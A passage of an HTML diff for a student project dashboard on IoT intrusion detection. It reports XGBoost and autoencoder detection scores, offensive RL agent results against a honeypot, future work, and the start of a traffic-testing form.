+          <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:#4ade80;margin-bottom:4px">SIMULATION</div>
+          <div style="font-family:'Bebas Neue',sans-serif;font-size:24px;color:#4ade80;line-height:1">45.50</div>
+          <div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted)">avg reward</div>
+        </div>
+        <div style="background:var(--bg);padding:20px">
+          <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:10px">
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">AVG STEPS</div><div style="font-size:14px;color:#f1f5f9">47.3 / 50</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">DETECTION</div><div style="font-size:14px;color:#4ade80">8%</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">SUCCESS RATE</div><div style="font-size:14px;color:#f1f5f9">39.4%</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">UNDETECTED</div><div style="font-size:14px;color:#4ade80">92% eps</div></div>
+          </div>
+          <div style="font-size:12px;color:#999;line-height:1.6">Learned to favour low-noise recon: tcp_syn_scan, coap_get_discover, mqtt_subscribe_wildcard. 92% of episodes completed without detection — below probabilistic threshold.</div>
+        </div>
+      </div>
+      <div style="display:grid;grid-template-columns:150px 1fr;gap:1px;background:var(--border)">
+        <div style="background:#070a14;padding:20px;border-left:3px solid var(--accent2)">
+          <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent2);margin-bottom:4px">LIVE</div>
+          <div style="font-family:'Bebas Neue',sans-serif;font-size:24px;color:var(--accent2);line-height:1">43.04</div>
+          <div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted)">avg reward</div>
+        </div>
+        <div style="background:var(--bg);padding:20px">
+          <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:10px">
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">AVG STEPS</div><div style="font-size:14px;color:#f1f5f9">50.0 / 50</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">DETECTION</div><div style="font-size:14px;color:#4ade80">0%</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">SUCCESS RATE</div><div style="font-size:14px;color:#f1f5f9">64.7%</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">DETECTED</div><div style="font-size:14px;color:#4ade80">NEVER</div></div>
+          </div>
+          <div style="font-size:12px;color:#999;line-height:1.6">Operated against the real GCP-hosted honeypot — never detected across all 50 episodes. Preferred: mqtt_topic_enum, http_path_traversal, tcp_port_scan. 64.7% real-world success confirms actions landed on live services.</div>
+        </div>
+      </div>
+      <div style="display:grid;grid-template-columns:150px 1fr;gap:1px;background:var(--border)">
+        <div style="background:#140505;padding:20px;border-left:3px solid var(--red)">
+          <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:4px">ADVERSARIAL</div>
+          <div style="font-family:'Bebas Neue',sans-serif;font-size:24px;color:var(--red);line-height:1">−4.32</div>
+          <div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted)">avg reward</div>
+        </div>
+        <div style="background:var(--bg);padding:20px">
+          <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:10px">
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">AVG STEPS</div><div style="font-size:14px;color:var(--red)">1.0 / 50</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">DETECTION</div><div style="font-size:14px;color:var(--red)">100%</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">SUCCESS RATE</div><div style="font-size:14px;color:#f1f5f9">48%</div></div>
+            <div><div style="font-family:'DM Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:3px">SURVIVED</div><div style="font-size:14px;color:var(--red)">0 eps</div></div>
+          </div>
+          <div style="font-size:12px;color:#999;line-height:1.6">Detected and terminated on the <strong style="color:#f1f5f9">first step of every single episode</strong> across all 50 runs. XGBoost + Autoencoder flagged the agent before a second action could execute. Not a failure — validation of the defensive AI.</div>
+        </div>
+      </div>
+    </div>
+
+    <div style="background:#0a0005;border:1px solid #3a0030;border-left:4px solid var(--purple);padding:24px 28px;margin-bottom:28px">
+      <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:4px;color:var(--purple);text-transform:uppercase;margin-bottom:12px">// The Core Conclusion of the Project</div>
+      <div style="font-size:15px;color:#f1f5f9;line-height:1.8">An adversarially optimised RL attacker that learned to evade probabilistic rules (simulation, 8% detection) and operate completely undetected against the live honeypot (live, 0% detection) <strong>could not survive a single step</strong> against the trained defensive models (adversarial, 100% detection). The defensive AI neutralises an adaptive trained attacker instantly and consistently.</div>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Difficulty Levels</div>
+    <div style="background:var(--card);border:1px solid var(--border);overflow:hidden">
+      <table class="tbl">
+        <thead><tr><th>Level</th><th>Detection Prob</th><th>Max Steps</th><th>Defense Model</th></tr></thead>
+        <tbody>
+          <tr><td style="color:#4ade80;font-family:'DM Mono',monospace">easy</td><td>30%</td><td>100</td><td>None</td></tr>
+          <tr><td style="color:var(--orange);font-family:'DM Mono',monospace">medium</td><td>60%</td><td>75</td><td>Binary XGBoost</td></tr>
+          <tr><td style="color:var(--red);font-family:'DM Mono',monospace">hard</td><td>90%</td><td>50</td><td>Binary + Multiclass + Autoencoder</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <div class="pf"><div class="pfl">OFFENSIVE RL // AI TRAINING — PART 03</div><div class="pfr"><span style="color:var(--red)">Sim 8% · Live 0% · Adversarial 100% detect → Defensive AI wins</span></div></div>
+</div>
+
+
+
+<div id="pg-report" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Stage 05 — Complete ✓</div>
+    <div class="ph-title">Final <span>Report</span></div>
+    <div class="ph-sub">Results Analysis · Model Performance · Future Work — ESTIN 2026</div>
+  </div>
+  <div class="sec">
+
+    <!-- REPORT PROGRESS -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Report Sections — Progress</div>
+    <div style="display:flex;flex-direction:column;gap:2px;background:var(--border);border:1px solid var(--border);margin-bottom:36px">
+      <div style="display:grid;grid-template-columns:260px 1fr 80px;gap:1px;background:var(--border)">
+        <div style="background:#0a1a12;padding:14px 18px;font-size:13px;color:#f1f5f9">Abstract &amp; Introduction</div>
+        <div style="background:var(--bg);padding:14px 0;display:flex;align-items:center"><div style="height:6px;width:100%;background:linear-gradient(90deg,var(--accent),#006655);margin-left:14px"></div></div>
+        <div style="background:#0a1a12;padding:14px;font-family:'DM Mono',monospace;font-size:10px;color:var(--accent);text-align:right">100%</div>
+      </div>
+      <div style="display:grid;grid-template-columns:260px 1fr 80px;gap:1px;background:var(--border)">
+        <div style="background:#0a1a12;padding:14px 18px;font-size:13px;color:#f1f5f9">Related Work</div>
+        <div style="background:var(--bg);padding:14px 0;display:flex;align-items:center"><div style="height:6px;width:100%;background:linear-gradient(90deg,var(--accent),#006655);margin-left:14px"></div></div>
+        <div style="background:#0a1a12;padding:14px;font-family:'DM Mono',monospace;font-size:10px;color:var(--accent);text-align:right">100%</div>
+      </div>
+      <div style="display:grid;grid-template-columns:260px 1fr 80px;gap:1px;background:var(--border)">
+        <div style="background:#0a1a12;padding:14px 18px;font-size:13px;color:#f1f5f9">System Architecture &amp; Design</div>
+        <div style="background:var(--bg);padding:14px 0;display:flex;align-items:center"><div style="height:6px;width:100%;background:linear-gradient(90deg,var(--accent),#006655);margin-left:14px"></div></div>
+        <div style="background:#0a1a12;padding:14px;font-family:'DM Mono',monospace;font-size:10px;color:var(--accent);text-align:right">100%</div>
+      </div>
+      <div style="display:grid;grid-template-columns:260px 1fr 80px;gap:1px;background:var(--border)">
+        <div style="background:#0a1a12;padding:14px 18px;font-size:13px;color:#f1f5f9">Dataset Analysis &amp; Data Science</div>
+        <div style="background:var(--bg);padding:14px 0;display:flex;align-items:center"><div style="height:6px;width:100%;background:linear-gradient(90deg,var(--accent),#006655);margin-left:14px"></div></div>
+        <div style="background:#0a1a12;padding:14px;font-family:'DM Mono',monospace;font-size:10px;color:var(--accent);text-align:right">100%</div>
+      </div>
+      <div style="display:grid;grid-template-columns:260px 1fr 80px;gap:1px;background:var(--border)">
+        <div style="background:#0a1a12;padding:14px 18px;font-size:13px;color:#f1f5f9">ML Results &amp; Metrics</div>
+        <div style="background:var(--bg);padding:14px 0;display:flex;align-items:center"><div style="height:6px;width:100%;background:linear-gradient(90deg,var(--accent),#006655);margin-left:14px"></div></div>
+        <div style="background:#0a1a12;padding:14px;font-family:'DM Mono',monospace;font-size:10px;color:var(--accent);text-align:right">100%</div>
+      </div>
+      <div style="display:grid;grid-template-columns:260px 1fr 80px;gap:1px;background:var(--border)">
+        <div style="background:#0a1a12;padding:14px 18px;font-size:13px;color:#f1f5f9">RL Evaluation</div>
+        <div style="background:var(--bg);padding:14px 0;display:flex;align-items:center"><div style="height:6px;width:100%;background:linear-gradient(90deg,var(--accent),#006655);margin-left:14px"></div></div>
+        <div style="background:#0a1a12;padding:14px;font-family:'DM Mono',monospace;font-size:10px;color:var(--accent);text-align:right">100%</div>
+      </div>
+      <div style="display:grid;grid-template-columns:260px 1fr 80px;gap:1px;background:var(--border)">
+        <div style="background:#0a1a12;padding:14px 18px;font-size:13px;color:#f1f5f9">Conclusion &amp; Future Work</div>
+        <div style="background:var(--bg);padding:14px 0;display:flex;align-items:center"><div style="height:6px;width:100%;background:linear-gradient(90deg,var(--accent),#006655);margin-left:14px"></div></div>
+        <div style="background:#0a1a12;padding:14px;font-family:'DM Mono',monospace;font-size:10px;color:var(--accent);text-align:right">100%</div>
+      </div>
+    </div>
+
+    <!-- DEFENSIVE RESULTS -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Defensive Model Results</div>
+    <div class="grid g3" style="margin-bottom:28px">
+      <div class="card" style="border-top:2px solid var(--accent)">
+        <div class="ct">XGBoost Binary</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:56px;color:var(--accent);line-height:1;margin:10px 0;text-shadow:0 0 20px rgba(0,229,195,.2)">99<span style="font-size:28px">%</span></div>
+        <div class="cd" style="margin-bottom:14px">F1 Score ~0.99 · ROC AUC ~0.99<br>Attack vs Benign classification</div>
+        <div style="display:flex;flex-direction:column;gap:4px">
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">Precision</span><span style="color:var(--accent)">~0.99</span></div>
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">Recall</span><span style="color:var(--accent)">~0.99</span></div>
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">False Positive Rate</span><span style="color:#4ade80">Very Low</span></div>
+        </div>
+      </div>
+      <div class="card" style="border-top:2px solid var(--accent2)">
+        <div class="ct" style="color:var(--accent2)">XGBoost Multi-Class</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:56px;color:var(--accent2);line-height:1;margin:10px 0;text-shadow:0 0 20px rgba(96,165,250,.2)">94<span style="font-size:28px">%</span></div>
+        <div class="cd" style="margin-bottom:14px">Macro F1 ~0.94 · 7 attack types<br>Per-class classification</div>
+        <div style="display:flex;flex-direction:column;gap:4px">
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">bruteforce / port_scan</span><span style="color:var(--accent2)">High F1</span></div>
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">mqtt_injection / ddos</span><span style="color:var(--accent2)">High F1</span></div>
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">Macro Average</span><span style="color:var(--accent2)">0.94</span></div>
+        </div>
+      </div>
+      <div class="card" style="border-top:2px solid var(--purple)">
+        <div class="ct" style="color:var(--purple)">Autoencoder Anomaly</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:56px;color:var(--purple);line-height:1;margin:10px 0;text-shadow:0 0 20px rgba(192,132,252,.2)">95<span style="font-size:28px">%</span></div>
+        <div class="cd" style="margin-bottom:14px">ROC AUC ~0.95 · Zero-day capable<br>Unsupervised anomaly detection</div>
+        <div style="display:flex;flex-direction:column;gap:4px">
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">Trained on</span><span style="color:var(--purple)">Benign only</span></div>
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">Latent dims</span><span style="color:var(--purple)">8</span></div>
+          <div style="display:flex;justify-content:space-between;font-family:'DM Mono',monospace;font-size:10px"><span style="color:var(--muted)">Zero-day attacks</span><span style="color:#4ade80">Detectable</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- OFFENSIVE RESULTS -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Offensive RL Results — HARD Difficulty (50 Episodes)</div>
+    <div style="background:var(--card);border:1px solid var(--border);overflow:hidden;margin-bottom:28px">
+      <table class="tbl">
+        <thead><tr><th>Mode</th><th>Avg Reward</th><th>Detection Rate</th><th>Avg Steps</th><th>Interpretation</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><span style="color:#4ade80;font-family:'DM Mono',monospace">Simulation</span></td>
+            <td style="color:#4ade80">45.50 ± 15.18</td>
+            <td style="color:#4ade80">8%</td>
+            <td>47.3 / 50</td>
+            <td>Agent learned stealth against probabilistic rules</td>
+          </tr>
+          <tr>
+            <td><span style="color:var(--accent2);font-family:'DM Mono',monospace">Live</span></td>
+            <td style="color:var(--accent2)">43.04 ± 14.20</td>
+            <td style="color:#4ade80">0%</td>
+            <td>50.0 / 50</td>
+            <td>Agent operated undetected on real honeypot</td>
+          </tr>
+          <tr style="background:#120008">
+            <td><span style="color:var(--red);font-family:'DM Mono',monospace">Adversarial</span></td>
+            <td style="color:var(--red)">−4.32 ± 2.20</td>
+            <td style="color:var(--red)">100%</td>
+            <td style="color:var(--red)">1.0 / 50</td>
+            <td style="color:#f1f5f9">Defensive AI neutralised agent on first step every time</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- FUTURE WORK -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Future Work — The Cat and Mouse Game</div>
+
+    <div style="background:#050010;border:1px solid #2a0040;border-left:4px solid var(--purple);padding:28px 32px;margin-bottom:24px">
+      <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:4px;color:var(--purple);text-transform:uppercase;margin-bottom:16px">// The Perpetual Adversarial Loop</div>
+      <div style="font-size:15px;color:#f1f5f9;line-height:1.9;max-width:720px">The current result — defensive AI neutralising the RL attacker on the first step every time — is not the end. It is the beginning of a <strong style="color:var(--purple)">cat and mouse game</strong>. Each time the defensive models improve enough to beat the offensive agent, the offensive agent can be retrained on the new defensive model, learning new evasion strategies. Then the defensive models retrain on the new adversarial traffic, becoming stronger again. This cycle continues indefinitely.</div>
+    </div>
+
+    <!-- Cat and Mouse Cycle Diagram -->
+    <div style="display:flex;align-items:stretch;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:24px">
+      <div style="background:#0a0f1a;padding:22px 20px;flex:1;border-left:3px solid var(--accent2);display:flex;flex-direction:column;justify-content:center">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent2);margin-bottom:8px">ROUND N — DEFENSIVE WINS</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.6">Current state: XGBoost + Autoencoder detects RL agent at step 1. Detection rate 100%. Defensive models are stronger.</div>
+      </div>
+      <div style="background:#111;padding:22px 14px;display:flex;align-items:center;justify-content:center;font-size:22px;color:var(--muted)">⇄</div>
+      <div style="background:#1a0a0a;padding:22px 20px;flex:1;border-left:3px solid var(--red);display:flex;flex-direction:column;justify-content:center">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:8px">ROUND N+1 — RETRAIN OFFENSIVE</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.6">RL agent retrains against the updated defensive models. Learns new evasion strategies, novel attack sequences, lower-noise primitives.</div>
+      </div>
+      <div style="background:#111;padding:22px 14px;display:flex;align-items:center;justify-content:center;font-size:22px;color:var(--muted)">⇄</div>
+      <div style="background:#0a1a0a;padding:22px 20px;flex:1;border-left:3px solid #4ade80;display:flex;flex-direction:column;justify-content:center">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:#4ade80;margin-bottom:8px">ROUND N+2 — RETRAIN DEFENSIVE</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.6">Defensive models retrain on the new adversarial traffic generated by the improved RL agent. Detection improves again. Loop continues.</div>
+      </div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:28px">
+      <div style="background:var(--card);padding:22px 24px">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--accent);text-transform:uppercase;margin-bottom:14px">Immediate Future Work</div>
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div style="display:flex;gap:10px;align-items:flex-start"><span style="color:var(--accent);font-family:'DM Mono',monospace;font-size:11px;flex-shrink:0">01</span><div style="font-size:13px;color:#ccc;line-height:1.5">Retrain RL agent on the current defensive models — test if it can find evasion paths the current XGBoost hasn't seen</div></div>
+          <div style="display:flex;gap:10px;align-items:flex-start"><span style="color:var(--accent);font-family:'DM Mono',monospace;font-size:11px;flex-shrink:0">02</span><div style="font-size:13px;color:#ccc;line-height:1.5">Retrain defensive models on adversarial traffic generated by the improved RL agent — close the evasion gaps</div></div>
+          <div style="display:flex;gap:10px;align-items:flex-start"><span style="color:var(--accent);font-family:'DM Mono',monospace;font-size:11px;flex-shrink:0">03</span><div style="font-size:13px;color:#ccc;line-height:1.5">Automate the adversarial loop — periodic retraining triggered when detection rate drops below threshold</div></div>
+          <div style="display:flex;gap:10px;align-items:flex-start"><span style="color:var(--accent);font-family:'DM Mono',monospace;font-size:11px;flex-shrink:0">04</span><div style="font-size:13px;color:#ccc;line-height:1.5">Deploy defensive models as real-time Logstash filter or sidecar container inside the ELK pipeline</div></div>
+        </div>
+      </div>
+      <div style="background:var(--card);padding:22px 24px">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--purple);text-transform:uppercase;margin-bottom:14px">Broader Vision — Securing IoT</div>
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div style="display:flex;gap:10px;align-items:flex-start"><span style="color:var(--purple);font-family:'DM Mono',monospace;font-size:11px;flex-shrink:0">→</span><div style="font-size:13px;color:#ccc;line-height:1.5">Extend to multi-protocol kill-chain sequences (MQTT recon → SSH bruteforce → HTTP exploit) — richer adversarial scenarios</div></div>
+          <div style="display:flex;gap:10px;align-items:flex-start"><span style="color:var(--purple);font-family:'DM Mono',monospace;font-size:11px;flex-shrink:0">→</span><div style="font-size:13px;color:#ccc;line-height:1.5">Generalise the pipeline to other IoT environments — industrial SCADA, medical IoT, smart city infrastructure</div></div>
+          <div style="display:flex;gap:10px;align-items:flex-start"><span style="color:var(--purple);font-family:'DM Mono',monospace;font-size:11px;flex-shrink:0">→</span><div style="font-size:13px;color:#ccc;line-height:1.5">Open-source the dataset and pipeline — contribute a rare labeled multi-protocol IoT attack dataset to the research community</div></div>
+          <div style="display:flex;gap:10px;align-items:flex-start"><span style="color:var(--purple);font-family:'DM Mono',monospace;font-size:11px;flex-shrink:0">→</span><div style="font-size:13px;color:#ccc;line-height:1.5">Each adversarial cycle produces a stronger, more generalisable defensive model — progressively better protection for real smart homes and IoT deployments</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Final submission card -->
+    <div style="background:var(--card);border:1px solid var(--border);padding:28px;display:flex;justify-content:space-between;align-items:center">
+      <div>
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);margin-bottom:6px">FINAL SUBMISSION</div>
+        <div style="font-size:18px;color:#f1f5f9;font-weight:700">Bouzira Mohamed &amp; Bakhti Rayane Abderaouef</div>
+        <div style="font-family:'DM Mono',monospace;font-size:11px;color:var(--muted);margin-top:4px">Encadrant: Dr Oussama Allama · ESTIN 2026</div>
+      </div>
+      <div style="text-align:right">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--accent);margin-bottom:6px">STATUS</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:32px;color:var(--accent)">COMPLETE ✓</div>
+      </div>
+    </div>
+
+  </div>
+  <div class="pf"><div class="pfl">REPORT // STAGE 05 — COMPLETE ✓</div><div class="pfr"><span class="ok">Binary 99% · Multi 94% · Autoencoder 95% · Adversarial Loop → Future Work</span></div></div>
+</div>
+
+<!-- LIVE TESTING PAGE -->
+<div id="pg-live-test" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Live Demo — AI-Powered</div>
+    <div class="ph-title">Live <span>Testing</span></div>
+    <div class="ph-sub">Send traffic parameters · Get real-time detection from our trained models via API</div>
+  </div>
+  <div class="sec">
+
+    <div style="background:#071420;border:1px solid #1a3a5a;border-left:3px solid var(--accent2);padding:18px 22px;margin-bottom:28px">
+      <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--accent2);text-transform:uppercase;margin-bottom:7px">// How It Works</div>
+      <div style="font-size:14px;color:var(--text);line-height:1.7">Fill in the traffic parameters below and submit. The request is sent to our backend API where the <strong>trained XGBoost binary classifier</strong> and <strong>multi-class classifier</strong> analyse the traffic and return a real-time prediction — <em>attack</em> or <em>benign</em>, with the attack type if detected.</div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 400px;gap:2px;background:var(--border);border:1px solid var(--border);margin-bottom:28px" id="tester-wrap">
+
+      <!-- INPUT FORM -->
+      <div style="background:var(--card);padding:28px">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:20px">Traffic Parameters</div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+          <div>
+            <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">PROTOCOL</label>
+            <select id="inp-protocol" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none;cursor:pointer">
+              <option value="MQTT">MQTT</option>
+              <option value="HTTP">HTTP</option>
+              <option value="CoAP">CoAP</option>
+              <option value="SSH">SSH / Telnet</option>
+              <option value="Network">Network / ICMP</option>
+            </select>
+          </div>
+          <div>
+            <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">DST PORT</label>
+            <input id="inp-port" type="number" value="1883" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none">
+          </div>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+          <div>
+            <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">BYTES SENT</label>
+            <input id="inp-bytes-sent" type="number" value="1024" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none">
+          </div>
+          <div>
+            <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">BYTES RECEIVED</label>
+            <input id="inp-bytes-recv" type="number" value="256" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none">
+          </div>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+          <div>
+            <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">REQUEST RATE (req/min)</label>
+            <input id="inp-req-rate" type="number" value="5" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none">
+          </div>
+          <div>
+            <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">PAYLOAD SIZE (bytes)</label>
+            <input id="inp-payload" type="number" value="128" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none">
+          </div>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+          <div>
+            <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">SESSION DURATION (sec)</label>
+            <input id="inp-duration" type="number" value="30" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none">
+          </div>
+          <div>
+            <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">SESSION DIVERSITY</label>
+            <input id="inp-diversity" type="number" value="2" min="0" max="50" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none">
+          </div>
+        </div>
+
+        <div style="margin-bottom:20px">
+          <label style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);display:block;margin-bottom:6px">BACKEND API URL</label>
+          <input id="inp-api-url" type="text" value="http://localhost:5000/predict" style="width:100%;background:#070f18;border:1px solid var(--border);color:#f1f5f9;padding:10px 12px;font-family:'DM Mono',monospace;font-size:12px;outline:none" placeholder="http://your-api-url/predict">
+        </div>
+
+        <!-- QUICK PRESETS -->
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:8px">QUICK PRESETS</div>
+        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:20px">
+          <button onclick="setPreset('benign_mqtt')"  style="font-family:'DM Mono',monospace;font-size:9px;padding:5px 12px;background:rgba(0,229,195,.06);border:1px solid var(--accent);color:var(--accent);cursor:pointer;letter-spacing:1px">BENIGN MQTT</button>
+          <button onclick="setPreset('benign_http')"  style="font-family:'DM Mono',monospace;font-size:9px;padding:5px 12px;background:rgba(0,229,195,.06);border:1px solid var(--accent);color:var(--accent);cursor:pointer;letter-spacing:1px">BENIGN HTTP</button>
+          <button onclick="setPreset('portscan')"     style="font-family:'DM Mono',monospace;font-size:9px;padding:5px 12px;background:rgba(251,146,60,.06);border:1px solid var(--orange);color:var(--orange);cursor:pointer;letter-spacing:1px">PORT SCAN</button>
+          <button onclick="setPreset('brute')"        style="font-family:'DM Mono',monospace;font-size:9px;padding:5px 12px;background:rgba(248,113,113,.06);border:1px solid var(--red);color:var(--red);cursor:pointer;letter-spacing:1px">SSH BRUTE</button>
+          <button onclick="setPreset('ddos')"         style="font-family:'DM Mono',monospace;font-size:9px;padding:5px 12px;background:rgba(192,132,252,.06);border:1px solid var(--purple);color:var(--purple);cursor:pointer;letter-spacing:1px">MQTT FLOOD</button>
+          <button onclick="setPreset('recon')"        style="font-family:'DM Mono',monospace;font-size:9px;padding:5px 12px;background:rgba(251,146,60,.06);border:1px solid var(--orange);color:var(--orange);cursor:pointer;letter-spacing:1px">RECON</button>
+          <button onclick="setPreset('http_exploit')" style="font-family:'DM Mono',monospace;font-size:9px;padding:5px 12px;background:rgba(248,113,113,.06);border:1px solid var(--red);color:var(--red);cursor:pointer;letter-spacing:1px">HTTP EXPLOIT</button>
+          <button onclick="setPreset('coap_flood')"   style="font-family:'DM Mono',monospace;font-size:9px;padding:5px 12px;background:rgba(192,132,252,.06);border:1px solid var(--purple);color:var(--purple);cursor:pointer;letter-spacing:1px">COAP FLOOD</button>
+        </div>
+
+        <button onclick="runTest()" id="btn-test" style="width:100%;background:var(--accent);color:#000;font-family:'DM Mono',monospace;font-size:11px;letter-spacing:3px;padding:14px;border:none;cursor:pointer;font-weight:700;text-transform:uppercase;transition:opacity .15s">▶ ANALYSE TRAFFIC</button>
+      </div>
+
+      <!-- OUTPUT PANEL -->
+      <div style="background:var(--bg);padding:28px;display:flex;flex-direction:column;gap:14px">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:6px">Detection Result</div>
+
